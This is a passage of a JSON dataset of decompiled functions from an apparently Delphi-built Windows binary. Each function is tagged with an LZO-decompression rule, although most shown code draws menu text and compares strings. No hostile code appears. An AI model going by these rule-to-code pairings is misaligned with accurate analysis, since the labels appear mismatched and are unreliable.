{\n                        piVar5 = fcn.0040646c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = *var_34h;\n                        *var_38h = 0x4008;\n                        var_38h[2] = var_3ch;\n                    }\n                    var_30h = var_30h + 1;\n                }\n                else if (uVar3 == 0) {\n                    if (var_2ch == 0xc) {\n                        if (*var_34h == 0x100) {\n                            var_40h = &fcn.0042c430::bstrString + var_30h * 2;\n                            piVar5 = fcn.0040646c();\n                            *var_40h = piVar5;\n                            var_40h[1] = NULL;\n                            *var_38h = 0x8;\n                            var_38h[2] = *var_40h;\n                            var_30h = var_30h + 1;\n                        }\n                        else {\n                            *var_38h = *var_34h;\n                            var_38h[1] = ppiVar1[1];\n                            var_38h[2] = ppiVar1[2];\n                            var_38h[3] = ppiVar1[3];\n                            var_34h = var_34h + 3;\n                        }\n                    }\n                    else {\n                        *var_38h = var_2ch;\n                        var_38h[2] = *var_34h;\n                        if ((4 < var_2ch) && (var_2ch < 8)) {\n                            var_34h = var_34h + 1;\n                            var_38h[3] = *var_34h;\n                        }\n                    }\n                }\n                else {\n                    if ((var_2ch == 0xc) && (**var_34h == 0x100)) {\n                        fcn.00411d34();\n                    }\n                    *var_38h = var_2ch | 0x4000;\n                    var_38h[2] = *var_34h;\n                }\n                var_34h = var_34h + 1;\n            }\n            uVar7 = uVar7 + 1;\n        } while (var_48h != uVar7);\n    }\n    var_50h = &fcn.0042c430::var_650h;\n    var_4ch = var_28h + 1;\n    var_44h = in_EDX[2];\n    uVar9 = *var_28h;\n    cVar4 = *in_EDX;\n    if (cVar4 == '\\x04') {\n        if ((var_650h & 0xfff) == 9) {\n            cVar4 = '\\b';\n        }\n        *var_28h = 0xfffffffd;\n        var_4ch = var_28h;\n        var_44h = var_44h + 1;\n    }\n    else if (((cVar4 == '\\x01') && (var_48h == 0)) && (arg_8h != 0)) {\n        cVar4 = '\\x03';\n    }\n    iVar6 = (**(*var_24h + 0x18))\n                      (var_24h, uVar9, *0x494a08, 0, cVar4, &fcn.0042c430::var_50h, arg_8h, &fcn.0042c430::var_20h, 0);\n    iVar8 = var_30h;\n    if (iVar6 != 0) {\n        fcn.0042ca08();\n        iVar8 = var_30h;\n    }\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        if (*(&stack0xfffffdb0 + iVar8 * 8) != 0) {\n            fcn.00406448();\n        }\n    }\n    *in_FS_OFFSET = var_24h;\n    iVar8 = var_30h;\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        sub.oleaut32.dll_SysFreeString_1(uVar9, (&fcn.0042c430::bstrString)[iVar8 * 2]);\n    }\n    return;\n}\n",
        "token_count": 1781
    },
    "00431604": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431604(uint param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    param_2 = param_2 + 1;\n    fcn.004059dc();\n    fcn.004314a0(param_2);\n    return;\n}\n",
        "token_count": 85
    },
    "00433d38": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00433d38(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 <= iVar2) {\n        uVar1 = fcn.004059dc();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.00409b5c();\n        if (iVar2 == 0) {\n            var_5h = 1;\n            fcn.00405a84();\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 220
    },
    "00433dc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433e87)\n\nvoid fcn.00433dc0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = 0x433dd9;\n    fcn.004059cc();\n    uStack40 = 0x433ee3;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.00433d38();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.00433d38();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.00433d38(),  cVar1 != '\\0')) || (cVar1 = fcn.00433d38(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar4 = 8;\n        do {\n            fcn.00433b40();\n            iVar3 = in_EAX;\n            if (in_EAX != 0) {\n                iVar3 = *(in_EAX + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            fcn.004059dc(iVar3, uVar2);\n            uStack44 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1();\n        } while ((iVar3 != 2) && (iVar4 = iVar4 + 1,  iVar4 != 0x256));\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x433eea;\n    uStack40 = 0x433eda;\n    fcn.00405530();\n    uStack40 = 0x433ee2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 485
    },
    "00434ae4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00434b30)\n// WARNING: Removing unreachable block (ram,0x00434b3a)\n\nvoid __cdecl fcn.00434ae4(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack52 = 0x434cd0;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.00436b60();\n    if ((iVar2 != 0) && (cVar1 = fcn.004383e0(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.004055c8();\n    uVar6 = (arg_8h & 0x400) == 0;\n    if ((!uVar6) &&\n       ((uVar6 = var_4h == NULL,  uVar6 || ((uVar6 = *var_4h == '&',  uVar6 && (uVar6 = var_4h[1] == '\\0',  uVar6))))))\n    {\n        fcn.00405818();\n    }\n    fcn.00405974();\n    if (uVar6) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.00425714(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x00434cba;\n    }\n    fcn.004250d4();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.00424a7c();\n        fcn.00424a88();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.004246fc();\n            pcVar5 = var_4h;\n            if (var_4h != NULL) {\n                pcVar5 = *(var_4h + -4);\n            }\n            uVar3 = fcn.004059dc(pcVar5, lprc, arg_8h);\n            uVar3 = fcn.00425714(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        if (arg_ch != '\\0') {\n            iVar2 = fcn.00424230();\n            iVar4 = fcn.00424230();\n            if (iVar2 == iVar4) {\n                fcn.004246fc();\n                goto code_r0x00434c91;\n            }\n        }\n        fcn.004246fc();\n    }\ncode_r0x00434c91:\n    pcVar5 = var_4h;\n    if (var_4h != NULL) {\n        pcVar5 = *(var_4h + -4);\n    }\n    uVar3 = fcn.004059dc(pcVar5, lprc, arg_8h);\n    uStackY120 = fcn.00425714(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x00434cba:\n    *in_FS_OFFSET = uStackY120;\n    fcn.00405530(0x434cd7);\n    return;\n}\n",
        "token_count": 961
    },
    "0043700c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043700c(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffb8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    char var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    uStack44 = 0x43714f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = '\\0';\n    var_10h = *in_EAX;\n    iVar2 = var_10h;\n    if (var_10h != 0) {\n        iVar2 = *(var_10h + -4);\n    }\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x494d08 + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                var_9h = '\\x01';\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    var_8h = param_1;\n    var_4h = param_2;\n    if (var_9h == '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (param_1 != 0) {\n            fcn.00405acc();\n            puVar1 = puStack40;\n        }\n    }\n    else {\n        var_10h = *in_EAX;\n        iVar2 = var_10h;\n        if (var_10h != 0) {\n            iVar2 = *(var_10h + -4);\n        }\n        uVar5 = iVar2 == 2;\n        puStack40 = &stack0xfffffffc;\n        fcn.00405a44(&var_14h);\n        fcn.00405974();\n        if (uVar5) {\n            var_10h = *in_EAX;\n            fcn.00405a44(&var_18h);\n            in_stack_ffffffb8 = var_4h;\n            fcn.004058e0(0x437164, 0x437188, var_4h, 0x43717c, 0x437170, var_18h);\n            puVar1 = puStack40;\n        }\n        else {\n            in_stack_ffffffb8 = 0x437188;\n            fcn.004058e0(0x437188, var_4h, 0x43717c, 0x437170, *in_EAX);\n            puVar1 = puStack40;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405554(0x437156);\n    return;\n}\n",
        "token_count": 761
    },
    "0043718c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043718c(uint param_1, uchar param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint *var_34h;\n    uint uStack52;\n    int32_t *var_2ch;\n    uchar auStack44 [3];\n    uint var_25h;\n    int32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x8;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_20h = 0x437614;\n    unique0x00007a00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0043718c::var_25h + 1;\n    _auStack44 = CONCAT13(param_2, auStack44) & 0xff00ffff;\n    puVar1 = &stack0xfffffffc;\n    var_18h = unaff_EDI;\n    if (var_25h == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            _auStack44 = 0x4371cd;\n            cVar2 = fcn.004377cc();\n            puVar1 = var_1ch;\n            if (cVar2 != '\\0') goto code_r0x004371d5;\n        }\n        *in_FS_OFFSET = stack0xffffffd8;\n        var_1ch = 0x43761b;\n        var_20h = 0x4375fe;\n        fcn.00405554();\n        var_20h = 0x43760b;\n        fcn.00405554();\n        var_20h = 0x437613;\n        fcn.00405530();\n        return;\n    }\ncode_r0x004371d5:\n    var_1ch = puVar1;\n    _auStack44 = 0x4371e3;\n    fcn.004055c8();\n    var_ch = NULL;\n    var_14h = NULL;\n    var_8h = NULL;\n    var_10h = 0;\n    var_2ch = 0x4375dd;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_34h = 0x437216;\n    _auStack44 = &stack0xfffffffc;\n    var_ch = fcn.00404620();\n    var_34h = 0x437225;\n    var_14h = fcn.00404620();\n    var_34h = 0x437234;\n    var_2ch = fcn.00404620();\n    var_34h = 0x437243;\n    var_8h = fcn.00404620();\n    var_34h = 0x43724d;\n    iVar3 = fcn.004365a0();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x437265;\n            iVar3 = fcn.004365b0();\n            uVar7 = *(iVar3 + 0x3e) == '\\0';\n            if (!uVar7) {\n                var_34h = 0x437278;\n                fcn.004365b0();\n                var_34h = 0x437285;\n                fcn.00405974();\n                if (!uVar7) {\n                    var_34h = 0x437294;\n                    iVar3 = fcn.004365b0();\n                    if (*(iVar3 + 0x30) != 0) {\n                        var_34h = 0x4372a7;\n                        fcn.004365b0();\n                        var_34h = 0x4372b2;\n                        fcn.00439384();\n                        var_34h = 0x4372bd;\n                        fcn.004097dc();\n                        if (var_1ch == NULL) {\n                            var_34h = 0x4372cc;\n                            var_34h = fcn.004365b0();\n                            var_38h = 0x4372d6;\n                            fcn.004365b0();\n                            var_38h = 0x4372e3;\n                            (**(*var_2ch + 100))();\n                        }\n                        else {\n                            var_34h = 0x4372f3;\n                            iVar3 = fcn.0040e8cc();\n                            if (iVar3 != 0) {\n                                var_38h = 0x437300;\n                                var_34h = &stack0xfffffffc;\n                                cVar2 = fcn.00436f58(&stack0xfffffffc);\n                                if (cVar2 == '\\0') {\n                                    var_34h = 0x43730e;\n                                    iVar3 = fcn.004365b0();\n                                    var_34h = iVar3 + 0x30;\n                                    var_38h = 0x43731b;\n                                    fcn.004365b0();\n                                    var_38h = 0x437326;\n                                    fcn.00439294();\n                                    var_34h = 0x43732f;\n                                    fcn.00405584();\n                                    var_34h = 0x437338;\n                                    var_34h = fcn.004365b0();\n                                    var_38h = 0x437342;\n                                    fcn.004365b0();\n                                    var_38h = 0x43734f;\n                                    (**(*var_2ch + 100))();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        } while (var_34h != 0x1);\n    }\n    var_34h = 0x437364;\n    fcn.004055c8();\n    var_34h = 0x43736c;\n    iVar3 = (**(*var_2ch + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x437384;\n            fcn.004055c8();\n            var_34h = 0x43738f;\n            (**(*var_14h + 8))();\n            var_34h = 0x437397;\n            (**(*var_ch + 0x44))();\n            var_34h = 0x43739f;\n            iVar3 = (**(*var_14h + 0x14))();\n            iVar3 = iVar3 + -1;\n            if (-1 < iVar3) {\n                do {\n                    var_34h = 0x4373b8;\n                    (**(*var_14h + 0xc))();\n                    iVar6 = 1;\n                    while( true ) {\n                        var_34h = 0x43745c;\n                        iVar5 = fcn.0040580c();\n                        if (iVar5 < iVar6) break;\n                        uVar4 = *(var_20h + -1 + iVar6);\n                        if ((*(*0x494d08 + (uVar4 >> 3)) >> (uVar4 & 7) & 1) == 0) {\n                            var_34h = &fcn.0043718c::var_40h;\n                            var_38h = 0x4373ee;\n                            fcn.00405a44();\n                            var_38h = 0x4373f9;\n                            fcn.004097dc();\n                            var_3ch = 0x437402;\n                            var_38h = &stack0xfffffffc;\n                            cVar2 = fcn.00436f58(&stack0xfffffffc);\n                            if (cVar2 != '\\0') {\n                                if (*(*0x494d28 + 0xc) == '\\0') {\n                                    var_38h = 0x437430;\n                                    fcn.00405acc();\n                                }\n                                else {\n                                    var_38h = 0x43741f;\n                                    fcn.0043700c();\n                                }\n                                var_38h = 0x43743a;\n                                (**(*var_14h + 0x18))();\n                                var_38h = 0x437447;\n                                (**(*var_ch + 0x3c))();\n                                var_38h = 0x437451;\n                                (**(*var_14h + 0x48))();\n                                break;\n                            }\n                        }\n                        else {\n                            iVar6 = iVar6 + 1;\n                        }\n                        iVar6 = iVar6 + 1;\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_34h = 0x437476;\n            iVar3 = (**(*var_ch + 0x14))();\n            if (var_10h < iVar3) {\n                var_38h = 0x437481;\n                var_34h = &stack0xfffffffc;\n                fcn.00436f88(&stack0xfffffffc);\n            }\n            var_34h = 0x43748a;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (iVar3 < 1) break;\n            var_34h = 0x437496;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (-1 < iVar3 + -1) {\n                do {\n                    var_34h = 0x4374aa;\n                    (**(*var_14h + 0x18))();\n                    var_34h = 0x4374b4;\n                    (**(*var_2ch + 0x5c))();\n                    var_34h = 0x4374be;\n                    (**(*var_2ch + 0x14))();\n                    var_34h = 0x4374cb;\n                    (**(*var_2ch + 0x70))();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        } while (var_34h != 0x1);\n    }\n    if (var_10h == 0) {\n        var_38h = 0x4374e4;\n        var_34h = &stack0xfffffffc;\n        fcn.00436f88(&stack0xfffffffc);\n    }\n    var_34h = 0x4374ed;\n    iVar3 = (**(*var_8h + 0x14))();\n    auStack44 = CONCAT12(0 < iVar3, auStack44._0_2_);\n    _auStack44 = _auStack44 & 0xff000000 | auStack44;\n    var_34h = 0x4374fb;\n    iVar3 = (**(*var_8h + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x437517;\n            (**(*var_8h + 0xc))();\n            if (*(*0x494d28 + 0xc) != '\\0') {\n                var_34h = 0x43752f;\n                iVar3 = fcn.0040e8cc();\n                if ((iVar3 == 0) && (var_18h != 0)) {\n                    var_34h = 0x437546;\n                    iVar3 = fcn.0040e8cc();\n                    if (iVar3 == 0) {\n                        var_34h = &fcn.0043718c::var_44h;\n                        var_38h = 0x437569;\n                        fcn.00405a44();\n                        var_38h = 0x437576;\n                        fcn.0043700c();\n                        var_38h = 0x437590;\n                        fcn.00405a84();\n                    }\n                }\n            }\n            var_34h = 0x43759a;\n            (**(*var_8h + 0x18))();\n            var_34h = 0x4375a5;\n            fcn.00405584();\n            var_34h = var_34h + -1;\n        } while (var_34h != NULL);\n    }\n    *in_FS_OFFSET = uStack52;\n    _auStack44 = 0x4375e4;\n    var_2ch = 0x4375c4;\n    fcn.00404650();\n    var_2ch = 0x4375cc;\n    fcn.00404650();\n    var_2ch = 0x4375d4;\n    fcn.00404650();\n    var_2ch = 0x4375dc;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 3023
    },
    "00438454": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x004384ea)\n// WARNING: Removing unreachable block (ram,0x00438502)\n\nvoid __cdecl fcn.00438454(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack44 = &var_2h + 2;\n    uStack48 = 0x43857f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.00437a24();\n        if ((iVar1 != 0) && (iVar2 = fcn.004365a0(),  in_ECX < iVar2)) {\n            iVar1 = fcn.004365b0();\n        }\n    }\n    else {\n        puStack44 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.00437a24();\n        uStack60 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.00405718();\n        fcn.00405718();\n        fcn.00405718(0);\n        uVar3 = fcn.004059dc();\n        fcn.00405718(0, uVar3);\n        uVar3 = fcn.004059dc();\n        iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar3);\n        if (iVar1 == 2) {\n            fcn.00439384();\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    uStack52 = 0x438586;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 520
    },
    "00439294": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439294(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    fcn.00405584();\n    for (iVar3 = 1; iVar2 = fcn.0040580c(),  iVar3 <= iVar2; iVar3 = iVar3 + 1) {\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x494d08 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (*(*param_2 + -1 + iVar3) == '&') {\n                if (*(*0x494d28 + 0xc) == '\\0') {\n                    bVar4 = false;\n                }\n                else {\n                    if (iVar3 < 2) {\n                        bVar4 = false;\n                    }\n                    else {\n                        iVar2 = *param_2;\n                        if (iVar2 != 0) {\n                            iVar2 = *(iVar2 + -4);\n                        }\n                        bVar4 = 1 < iVar2 - iVar3;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + -2 + iVar3) == '(';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + 1 + iVar3) == ')';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                }\n                if (bVar4) {\n                    fcn.00405a84();\n                }\n                else {\n                    fcn.00405a84();\n                }\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 410
    },
    "00439384": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00439384(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.00405530();\n    iVar3 = 1;\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x494d08 + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.00405718();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "004393ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00439436)\n// WARNING: Removing unreachable block (ram,0x00439442)\n\nvoid fcn.004393ec(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x43948f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.00439294();\n    fcn.00439294();\n    uVar1 = fcn.004059dc(0);\n    uVar1 = fcn.004059dc(0, uVar1);\n    uVar2 = 0x400;\n    sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x439496);\n    return;\n}\n",
        "token_count": 258
    },
    "0043c2a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c2a4(uint param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n    // switch table (8 cases) at 0x43c47e\n        switch(*(param_2 + 4)) {\n        case 0:\n            fcn.0043c61c();\n            break;\n        case 1:\n            fcn.0043c61c();\n            break;\n        case 2:\n            fcn.0043c1ac();\n            fcn.0043c61c();\n            break;\n        case 3:\n            fcn.0043c1ac();\n            fcn.0043c61c();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                fcn.0043c61c();\n            }\n            else {\n                fcn.0043c244(&stack0xfffffffc);\n                fcn.0043c61c();\n            }\n            break;\n        case 5:\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    fcn.0043c61c();\n                }\n                else {\n                    fcn.0043c244(&stack0xfffffffc);\n                    fcn.0043c61c();\n                }\n            }\n            break;\n        case 6:\n            fcn.0043c61c();\n            break;\n        case 7:\n            fcn.0043c61c();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar3 = *(in_EAX + 0x40);\n            var_10h = *(in_EAX + 8) % iVar3;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar3 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar3;\n        }\n        else {\n            iVar3 = 0;\n            var_10h = 0;\n        }\n        var_14h = 0;\n        for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n            iVar2 = sub.kernel32.dll_GetTickCount_1();\n            if (iVar2 - var_14h < *(in_EAX + 0x20)) {\n                sub.kernel32.dll_Sleep_2(*(in_EAX + 0x20) - (iVar2 - var_14h));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043c61c();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043c61c();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043c61c();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043c61c();\n            }\n            (**(**(in_EAX + 4) + 0x8c))();\n            var_14h = iVar2;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043c61c();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043c61c();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043c61c();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043c61c();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 915
    },
    "00443930": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00443994)\n// WARNING: Removing unreachable block (ram,0x004439b4)\n// WARNING: Removing unreachable block (ram,0x004439bd)\n// WARNING: Removing unreachable block (ram,0x004439c2)\n// WARNING: Removing unreachable block (ram,0x004439cf)\n// WARNING: Removing unreachable block (ram,0x004439d4)\n// WARNING: Removing unreachable block (ram,0x004439e1)\n\nvoid __fastcall fcn.00443930(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x443a05;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.00450804();\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.00450814();\n        fcn.004508c4();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.0043e40c();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x443a0c;\n    uStack28 = 0x443a04;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 373
    },
    "004458cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
